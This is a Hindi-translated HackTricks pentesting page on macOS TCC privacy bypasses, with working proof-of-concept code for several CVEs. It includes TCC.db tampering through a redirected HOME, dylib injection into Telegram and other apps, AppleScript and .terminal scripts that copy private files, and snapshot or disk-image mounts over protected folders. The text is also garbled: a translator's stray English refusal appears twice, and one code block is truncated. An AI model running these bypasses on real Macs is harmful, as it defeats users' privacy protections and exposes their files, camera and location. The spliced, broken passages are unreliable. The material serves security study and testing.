# macOS TCC बायपास

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबरसिक्योरिटी कंपनी** में काम करते हैं? क्या आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे**? या क्या आप **PEASS के नवीनतम संस्करण तक पहुँच चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* **[**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) में शामिल हों या [**telegram group**](https://t.me/peass) में या मुझे **Twitter** पर **फॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपनी हैकिंग ट्रिक्स साझा करें, hacktricks repo** को PRs सबमिट करके और [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) को।

</details>

## कार्यक्षमता द्वारा

### लिखने का बायपास

यह एक बायपास नहीं है, यह सिर्फ TCC कैसे काम करता है: **यह लिखने से नहीं बचाता**. अगर Terminal को यूजर के Desktop को पढ़ने की एक्सेस नहीं है तो भी वह उसमें लिख सकता है:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
नई **फ़ाइल** में **विस्तारित विशेषता `com.apple.macl`** जोड़ी जाती है ताकि **निर्माता ऐप** को इसे पढ़ने की पहुंच मिल सके।

### SSH बायपास

डिफ़ॉल्ट रूप से **SSH के माध्यम से पहुंच "Full Disk Access"** के साथ होती थी। इसे अक्षम करने के लिए आपको इसे सूचीबद्ध करने की जरूरत है लेकिन अक्षम करना होगा (इसे सूची से हटाने से उन विशेषाधिकारों को हटाया नहीं जाएगा):

![](<../../../../../.gitbook/assets/image (569).png>)

यहां आपको कुछ **मैलवेयर्स के उदाहरण मिलेंगे जो इस सुरक्षा को बायपास करने में सक्षम हुए हैं**:

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

{% hint style="danger" %}
ध्यान दें कि अब, SSH को सक्षम करने के लिए आपको **Full Disk Access** की आवश्यकता है
{% endhint %}

### हैंडल एक्सटेंशन्स - CVE-2022-26767

विशेषता **`com.apple.macl`** फ़ाइलों को दी जाती है ताकि **किसी निश्चित एप्लिकेशन को इसे पढ़ने की अनुमति मिल सके।** यह विशेषता तब सेट की जाती है जब कोई फ़ाइल को एक ऐप पर **ड्रैग एंड ड्रॉप** करता है, या जब उपयोगकर्ता फ़ाइल को **डबल-क्लिक** करके इसे **डिफ़ॉल्ट एप्लिकेशन** के साथ खोलता है।

इसलिए, एक उपयोगकर्ता **एक दुर्भावनापूर्ण ऐप को रजिस्टर** कर सकता है जो सभी एक्सटेंशन्स को हैंडल करता है और Launch Services को कॉल करके किसी भी फ़ाइल को **खोलने** के लिए (ताकि दुर्भावनापूर्ण फ़ाइल को पढ़ने की पहुंच प्रदान की जा सके)।

### iCloud

एंटाइटलमेंट **`com.apple.private.icloud-account-access`** के साथ यह संभव है कि **`com.apple.iCloudHelper`** XPC सेवा के साथ संवाद किया जा सके जो **iCloud टोकन प्रदान करेगी**।

**iMovie** और **Garageband** में यह एंटाइटलमेंट और अन्य थे जो अनुमति देते थे।

उस एंटाइटलमेंट से **iCloud टोकन प्राप्त करने** के लिए अधिक **जानकारी** के लिए टॉक देखें: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=\_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

**`kTCCServiceAppleEvents`** अनुमति वाला एक ऐप अन्य ऐप्स को **नियंत्रित करने** में सक्षम होगा। इसका मतलब है कि यह अन्य ऐप्स को दी गई अनुमतियों का **दुरुपयोग कर सकता है**।

Apple Scripts के बारे में अधिक जानकारी के लिए देखें:

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

उदाहरण के लिए, यदि किसी ऐप को **`iTerm` पर Automation अनुमति है**, उदाहरण के लिए इस उदाहरण में **`Terminal`** को iTerm पर पहुंच है:

<figure><img src="../../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>

#### iTerm के ऊपर

Terminal, जिसके पास FDA नहीं है, iTerm को कॉल कर सकता है, जिसके पास यह है, और इसका उपयोग क्रियाओं को प्रदर्शित करने के लिए कर सकता है:

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```
Since the provided text does not contain any content to translate, I cannot provide a translation. If you provide the relevant English text that needs to be translated into Hindi, I will be able to assist you.
```bash
osascript iterm.script
```
#### फाइंडर के माध्यम से

या यदि किसी ऐप को फाइंडर के माध्यम से पहुंच प्राप्त हो, तो वह इस तरह की स्क्रिप्ट का उपयोग कर सकता है:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## ऐप व्यवहार द्वारा

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

यूजरलैंड **tccd डेमॉन** **`HOME`** **env** वेरिएबल का उपयोग कर रहा था TCC यूजर्स डेटाबेस तक पहुँचने के लिए: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

[इस Stack Exchange पोस्ट](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) के अनुसार और क्योंकि TCC डेमॉन `launchd` के माध्यम से वर्तमान यूजर के डोमेन में चल रहा है, इसे पास किए गए **सभी एनवायरनमेंट वेरिएबल्स को नियंत्रित करना संभव है**।\
इस प्रकार, एक **हमलावर `$HOME` एनवायरनमेंट** वेरिएबल को **`launchctl`** में सेट कर सकता है ताकि वह एक **नियंत्रित डायरेक्टरी** की ओर इशारा करे, **TCC** डेमॉन को **रीस्टार्ट** करे, और फिर **सीधे TCC डेटाबेस को मॉडिफाई करे** ताकि वह खुद को **हर TCC एंटाइटलमेंट उपलब्ध करा सके** बिना कभी अंतिम यूजर को प्रॉम्प्ट किए।\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - नोट्स

नोट्स को TCC संरक्षित स्थानों तक पहुँच थी लेकिन जब एक नोट बनाया जाता है तो यह **एक गैर-संरक्षित स्थान में बनाया जाता है**। इसलिए, आप नोट्स से किसी संरक्षित फ़ाइल को एक नोट में कॉपी करने के लिए कह सकते हैं (इसलिए एक गैर-संरक्षित स्थान में) और फिर फ़ाइल तक पहुँच सकते हैं:

<figure><img src="../../../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - ट्रांसलोकेशन

बाइनरी `/usr/libexec/lsd` जिसमें लाइब्रेरी `libsecurity_translocate` थी, को एंटाइटलमेंट `com.apple.private.nullfs_allow` प्राप्त था जिससे यह **nullfs** माउंट बना सकता था और इसे `com.apple.private.tcc.allow` एंटाइटलमेंट भी प्राप्त था जिसमें **`kTCCServiceSystemPolicyAllFiles`** था जिससे यह हर फ़ाइल तक पहुँच सकता था।

"Library" को क्वारंटीन एट्रिब्यूट जोड़ना संभव था, **`com.apple.security.translocation`** XPC सेवा को कॉल करना और फिर यह Library को **`$TMPDIR/AppTranslocation/d/d/Library`** में मैप कर देता था जहाँ Library के अंदर के सभी दस्तावेज़ **पहुँचे जा सकते थे**।

### CVE-2023-38571 - म्यूज़िक और टीवी <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Music`** में एक दिलचस्प फीचर है: जब यह चल रहा होता है, तो यह **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** में ड्रॉप की गई फ़ाइलों को उपयोगकर्ता की "मीडिया लाइब्रेरी" में **आयात** करेगा। इसके अलावा, यह कुछ ऐसा कॉल करता है: **`rename(a, b);`** जहाँ `a` और `b` हैं:

* `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
* `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3"`

यह **`rename(a, b);`** व्यवहार एक **Race Condition** के लिए संवेदनशील है, क्योंकि यह संभव है कि `Automatically Add to Music.localized` फ़ोल्डर में एक नकली **TCC.db** फ़ाइल डाली जाए और फिर जब नया फ़ोल्डर(b) फ़ाइल को कॉपी करने के लिए बनाया जाता है, तो फ़ाइल को हटा दें, और इसे **`~/Library/Application Support/com.apple.TCC`**/ की ओर इशारा करें।

### SQLITE_SQLLOG_DIR - CVE-2023-32422

अगर **`SQLITE_SQLLOG_DIR="path/folder"`** मूल रूप से यह दर्शाता है कि **कोई भी खुला db उस पथ पर कॉपी किया जाता है**। इस CVE में इस नियंत्रण का दुरुपयोग किया गया था एक **SQLite डेटाबेस** के अंदर **लिखने** के लिए जो कि **FDA द्वारा खोला जाने वाला TCC डेटाबेस** होगा, और फिर **`SQLITE_SQLLOG_DIR`** का दुरुपयोग करना एक **सिम्लिंक के साथ फ़ाइलनाम में** ताकि जब वह डेटाबेस **खोला जाए**, उपयोगकर्ता **TCC.db को खोले गए डेटाबेस से अधिलेखित** किया जाता है।\
**अधिक जानकारी** [**लेख में**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **और**[ **वार्ता में**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y\&t=20548s).

### **SQLITE_AUTO_TRACE**

अगर पर्यावरण चर **`SQLITE_AUTO_TRACE`** सेट है, तो लाइब्रेरी **`libsqlite3.dylib`** सभी SQL क्वेरीज़ की **लॉगिंग** शुरू कर देगी। कई एप्लिकेशन इस लाइब्रेरी का उपयोग करते थे, इसलिए उनकी सभी SQLite क्वेरीज़ को लॉग करना संभव था।

कई Apple एप्लिकेशन इस लाइब्रेरी का उपयोग TCC संरक्षित जानकारी तक पहुँचने के लिए करते थे।
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL\_DUMP\_PIPELINES\_TO\_JSON\_FILE - CVE-2023-32407

यह **env variable `Metal` framework द्वारा उपयोग की जाती है** जो विभिन्न प्रोग्रामों के लिए एक निर्भरता है, विशेष रूप से `Music`, जिसमें FDA है।

निम्नलिखित सेट करना: `MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`। यदि `path` एक मान्य निर्देशिका है, तो बग ट्रिगर होगा और हम `fs_usage` का उपयोग करके देख सकते हैं कि प्रोग्राम में क्या हो रहा है:

* एक फ़ाइल `open()` की जाएगी, जिसे `path/.dat.nosyncXXXX.XXXXXX` कहा जाता है (X यादृच्छिक है)
* एक या अधिक `write()` फ़ाइल की सामग्री को लिखेंगे (हम इसे नियंत्रित नहीं करते)
* `path/.dat.nosyncXXXX.XXXXXX` को `path/name` में `renamed()` किया जाएगा

यह एक अस्थायी फ़ाइल लेखन है, इसके बाद **`rename(old, new)`** **जो सुरक्षित नहीं है।**

यह सुरक्षित नहीं है क्योंकि इसे **पुराने और नए पथों को अलग से हल करना होगा**, जिसमें कुछ समय लग सकता है और यह Race Condition के लिए संवेदनशील हो सकता है। अधिक जानकारी के लिए आप `xnu` फ़ंक्शन `renameat_internal()` की जांच कर सकते हैं।

{% hint style="danger" %}
तो, मूल रूप से, यदि एक विशेषाधिकार प्राप्त प्रक्रिया एक फ़ोल्डर से नाम बदल रही है जिसे आप नियंत्रित करते हैं, तो आप RCE जीत सकते हैं और इसे एक अलग फ़ाइल तक पहुंचा सकते हैं या, इस CVE की तरह, विशेषाधिकार प्राप्त ऐप द्वारा बनाई गई फ़ाइल को खोल सकते हैं और एक FD स्टोर कर सकते हैं।

यदि नाम बदलने की प्रक्रिया एक फ़ोल्डर तक पहुंचती है जिसे आप नियंत्रित करते हैं, जबकि आपने स्रोत फ़ाइल को संशोधित किया है या इसका एक FD है, तो आप गंतव्य फ़ाइल (या फ़ोल्डर) को एक symlink की ओर इंगित करने के लिए बदल सकते हैं, ताकि आप जब चाहें लिख सकें।
{% endhint %}

यह CVE में हमला था: उदाहरण के लिए, उपयोगकर्ता के `TCC.db` को अधिलेखित करने के लिए, हम कर सकते हैं:

* `/Users/hacker/ourlink` बनाएं जो `/Users/hacker/Library/Application Support/com.apple.TCC/` की ओर इंगित करता है
* निर्देशिका `/Users/hacker/tmp/` बनाएं
* `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db` सेट करें
* इस env var के साथ `Music` चलाकर बग को ट्रिगर करें
* `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` के `open()` को पकड़ें (X यादृच्छिक है)
* यहां हम इस फ़ाइल को लिखने के लिए भी `open()` करते हैं, और फ़ाइल डिस्क्रिप्टर को पकड़े रखते हैं
* `/Users/hacker/tmp` को `/Users/hacker/ourlink` के साथ **एक लूप में** तात्कालिक रूप से बदलें
* हम यह इसलिए करते हैं ताकि हमारी सफलता की संभावनाएं अधिकतम हों क्योंकि रेस विंडो काफी संकीर्ण है, लेकिन रेस हारने का नकारात्मक पक्ष नगण्य है
* थोड़ा इंतजार करें
* परीक्षण करें कि क्या हम भाग्यशाली थे
* यदि नहीं, तो शीर्ष से फिर से चलाएं

अधिक जानकारी के लिए [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html) देखें।

{% hint style="danger" %}
अब, यदि आप env variable `MTL_DUMP_PIPELINES_TO_JSON_FILE` का उपयोग करने की कोशिश करते हैं तो ऐप्स लॉन्च नहीं होंगे
{% endhint %}

### Apple Remote Desktop

रूट के रूप में आप इस सेवा को सक्षम कर सकते हैं और **ARD एजेंट के पास पूर्ण डिस्क एक्सेस होगा** जिसे उपयोगकर्ता द्वारा इसे एक नए **TCC उपयोगकर्ता डेटाबेस** की प्रतिलिपि बनाने के लिए दुरुपयोग किया जा सकता है।

## **NFSHomeDirectory** द्वारा

TCC उपयोगकर्ता के HOME फ़ोल्डर में एक डेटाबेस का उपयोग करता है जो **$HOME/Library/Application Support/com.apple.TCC/TCC.db** पर उपयोगकर्ता के लिए विशिष्ट संसाधनों तक पहुंच को नियंत्रित करता है।\
इसलिए, यदि उपयोगकर्ता TCC को $HOME env variable के साथ एक **अलग फ़ोल्डर** की ओर इंगित करते हुए पुनः आरंभ करने में सफल होता है, तो उपयोगकर्ता **/Library/Application Support/com.apple.TCC/TCC.db** में एक नया TCC डेटाबेस बना सकता है और TCC को किसी भी TCC अनुमति को किसी भी ऐप को प्रदान करने के लिए चालाकी से प्रेरित कर सकता है।

{% hint style="success" %}
नोट करें कि Apple उपयोगकर्ता की प्रोफ़ाइल में संग्रहीत सेटिंग का उपयोग करता है **`NFSHomeDirectory`** विशेषता के लिए **`$HOME` के मूल्य के रूप में**, इसलिए यदि आप इस मूल्य को संशोधित करने के लिए अनुमतियों के साथ एक एप्लिकेशन को समझौता करते हैं (**`kTCCServiceSystemPolicySysAdminFiles`**), आप इस विकल्प को TCC बायपास के साथ **हथियार बना सकते हैं**।
{% endhint %}

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**पहला POC** [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) और [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) का उपयोग करके उपयोगकर्ता के **HOME** फ़ोल्डर को संशोधित करता है।

1. लक्षित ऐप के लिए एक _csreq_ blob प्राप्त करें।
2. आवश्यक पहुंच और _csreq_ blob के साथ एक नकली _TCC.db_ फ़ाइल लगाएं।
3. [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) के साथ उपयोगकर्ता की Directory Services प्रविष्टि को निर्यात करें।
4. उपयोगकर्ता के होम डायरेक्टरी को बदलने के लिए Directory Services प्रविष्टि को संशोधित करें।
5. संशोधित Directory Services प्रविष्टि को [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) के साथ आयात करें।
6. उपयोगकर्ता के _tccd_ को रोकें और प्रक्रिया को पुनः आरंभ करें।

दूसरा POC **`/usr/libexec/configd`** का उपयोग करता था जिसमें `com.apple.private.tcc.allow` के साथ मान `kTCCServiceSystemPolicySysAdminFiles` था।\
यह संभव था कि **`configd`** को **`-t`** विकल्प के साथ चलाया जाए, एक हमलावर एक **कस्टम बंडल लोड करने के लिए निर्दिष्ट कर सकता है**। इसलिए, एक्सप्लॉइट **उपयोगकर्ता के होम डायरेक्टरी को बदलने के लिए **`dsexport`** और **`dsimport`** विधि को **`configd` कोड इंजेक्शन** से बदल देता है।

अधिक जानकारी के लिए [**मूल रिपोर्ट**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/) देखें।

## प्रक्रिया इंजेक्शन द्वारा

एक प्रक्रिया के अंदर कोड इंजेक्ट करने और इसकी TCC विशेषाधिकारों का दुरुपयोग करने के लिए विभिन्न तकनीकें हैं:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
अधिक जानकारी के लिए [**मूल रिपोर्ट**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/) देखें।

### डिवाइस अब्सट्रैक्शन लेयर (DAL) प्लग-इन्स

सिस्टम एप्लिकेशन जो Core Media I/O के माध्यम से कैमरा स्ट्रीम खोलते हैं (एप्स जिनमें **`kTCCServiceCamera`** होता है) वे `/Library/CoreMediaIO/Plug-Ins/DAL` में स्थित **इन प्लग-इन्स को प्रोसेस में लोड करते हैं** (SIP प्रतिबंधित नहीं है)।

वहां पर एक लाइब्रेरी को सामान्य **कंस्ट्रक्टर** के साथ स्टोर करना काम करेगा ताकि **कोड इंजेक्ट** किया जा सके।

कई Apple एप्लिकेशन इसके लिए संवेदनशील थे।

### Firefox

Firefox एप्लिकेशन में `com.apple.security.cs.disable-library-validation` और `com.apple.security.cs.allow-dyld-environment-variables` एंटाइटलमेंट्स थे:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
इसका आसानी से शोषण करने के बारे में अधिक जानकारी के लिए [**मूल रिपोर्ट देखें**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

बाइनरी `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` में **`com.apple.private.tcc.allow`** और **`com.apple.security.get-task-allow`** अधिकार थे, जिससे प्रक्रिया के अंदर कोड इंजेक्ट करने और TCC विशेषाधिकारों का उपयोग करने की अनुमति मिलती थी।

### CVE-2023-26818 - Telegram

Telegram में **`com.apple.security.cs.allow-dyld-environment-variables`** और **`com.apple.security.cs.disable-library-validation`** अधिकार थे, इसलिए इसका दुरुपयोग करके **इसकी अनुमतियों तक पहुंच प्राप्त करना** संभव था जैसे कि कैमरा के साथ रिकॉर्डिंग। आप [**लेख में पेलोड पा सकते हैं**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

ध्यान दें कि एक पुस्तकालय को लोड करने के लिए env वेरिएबल का उपयोग कैसे किया जाता है, इस पुस्तकालय को इंजेक्ट करने के लिए एक **कस्टम plist** बनाया गया था और **`launchctl`** का उपयोग करके इसे लॉन्च किया गया था:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## ओपन इन्वोकेशन के द्वारा

सैंडबॉक्स्ड होते हुए भी **`open`** को इन्वोक करना संभव है।

### टर्मिनल स्क्रिप्ट्स

टेक लोगों द्वारा प्रयुक्त कंप्यूटरों में कम से कम, टर्मिनल को **Full Disk Access (FDA)** देना काफी आम है। और इसके साथ **`.terminal`** स्क्रिप्ट्स को इन्वोक करना संभव है।

**`.terminal`** स्क्रिप्ट्स प्लिस्ट फाइलें होती हैं जैसे कि यह एक, जिसमें कमांड को **`CommandString`** कुंजी में निष्पादित किया जाता है:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
एक एप्लिकेशन /tmp जैसे स्थान पर एक टर्मिनल स्क्रिप्ट लिख सकता है और इसे निम्नलिखित कमांड के साथ लॉन्च कर सकता है:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## माउंटिंग द्वारा

### CVE-2020-9771 - mount\_apfs TCC बाईपास और प्रिविलेज एस्केलेशन

**कोई भी उपयोगकर्ता** (अनाधिकृत वाले भी) एक टाइम मशीन स्नैपशॉट बना सकता है और उसे माउंट कर सकता है और **सभी फाइलों तक पहुंच** सकता है जो उस स्नैपशॉट में हैं।\
इसके लिए **केवल विशेषाधिकार** की आवश्यकता होती है कि उपयोग में लाया गया एप्लिकेशन (जैसे `Terminal`) के पास **पूर्ण डिस्क एक्सेस** (FDA) एक्सेस (`kTCCServiceSystemPolicyAllfiles`) हो, जिसे एक एडमिन द्वारा अनुमति दी जानी चाहिए।

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

एक अधिक विस्तृत विवरण [**मूल रिपोर्ट में पाया जा सकता है**](https://theevilbit.github.io/posts/cve_2020_9771/)**।**

### CVE-2021-1784 & CVE-2021-30808 - TCC फाइल पर माउंट करना

भले ही TCC DB फाइल सुरक्षित हो, एक नई TCC.db फाइल को **डायरेक्टरी पर माउंट करना** संभव था:

{% code overflow="wrap" %}
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```
Since the provided text does not contain any content to translate, I cannot provide a translation. Please provide the relevant English text that needs to be translated into Hindi, and I will be happy to assist you.
```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
**पूर्ण एक्सप्लॉइट** की जांच [**मूल लेखन**](https://theevilbit.github.io/posts/cve-2021-30808/) में करें।

### asr

उपकरण **`/usr/sbin/asr`** पूरी डिस्क की प्रतिलिपि बनाने और उसे दूसरी जगह माउंट करने की अनुमति देता था, जिससे TCC सुरक्षा को दरकिनार किया जा सकता था।

### Location Services

**`/var/db/locationd/clients.plist`** में एक तीसरा TCC डेटाबेस है जो **स्थान सेवाओं तक पहुंचने के लिए** अनुमति वाले ग्राहकों को दर्शाता है।\
**`/var/db/locationd/`** फोल्डर DMG माउंटिंग से सुरक्षित नहीं था, इसलिए हम अपनी खुद की plist माउंट कर सकते थे।

## स्टार्टअप ऐप्स द्वारा

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

## grep द्वारा

कई बार फाइलें संवेदनशील जानकारी जैसे ईमेल, फोन नंबर, संदेश आदि को नॉन-प्रोटेक्टेड स्थानों पर स्टोर करती हैं (जो Apple में एक वल्नरेबिलिटी मानी जाती है)।

<figure><img src="../../../../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

यह अब काम नहीं करता, लेकिन [**पहले किया करता था**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

[**CoreGraphics इवेंट्स**](https://objectivebythesea.org/v2/talks/OBTS\_v2\_Wardle.pdf) का उपयोग करके एक और तरीका:

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

## संदर्भ

